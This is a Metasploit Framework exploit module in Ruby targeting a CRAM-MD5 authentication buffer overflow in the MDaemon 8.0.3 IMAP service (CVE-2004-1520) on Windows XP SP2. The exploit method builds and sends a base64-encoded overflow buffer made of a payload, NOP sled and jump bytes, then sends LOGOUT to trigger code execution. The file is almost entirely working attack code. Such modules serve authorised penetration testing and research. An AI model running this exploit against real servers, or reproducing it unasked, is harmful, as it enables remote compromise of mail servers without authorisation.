##
# $Id: mdaemon_cram_md5.rb 9583 2010-06-22 19:11:05Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Imap

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mdaemon 8.0.3 IMAPD CRAM-MD5 Authentication Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in the CRAM-MD5
				authentication of the MDaemon IMAP service. This
				vulnerability was discovered by Muts.
			},
			'Author'         => [ 'anonymous' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 9583 $',
			'References'     =>
				[
					[ 'CVE', '2004-1520'],
					[ 'OSVDB', '11838'],
					[ 'BID', '11675'],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'MDaemon IMAP 8.0.3 Windows XP SP2', { } ],
				],
			'DisclosureDate' => 'Nov 12 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect

		print_status("Asking for CRAM-MD5 authentication...")
		sock.put("a001 authenticate cram-md5\r\n")
		res = sock.get_once


		print_status("Received CRAM-MD5 answer: #{res.chomp}")
		# Magic no return-address exploitation ninjaness!
		buf = 'AAAA' + payload.encoded + make_nops(258) + "\xe9\x05\xfd\xff\xff"
		req = Rex::Text.encode_base64(buf) + "\r\n"
		sock.put(req)
		res = sock.get_once

		print_status("Received authentication reply: #{res.chomp}")
		print_status("Sending LOGOUT to close the thread and trigger an exception")
		sock.put("a002 LOGOUT\r\n")
		res = sock.get_once

		print_status("Received LOGOUT reply: #{res.chomp}")
		select(nil,nil,nil,1)

		handler
		disconnect
	end

end
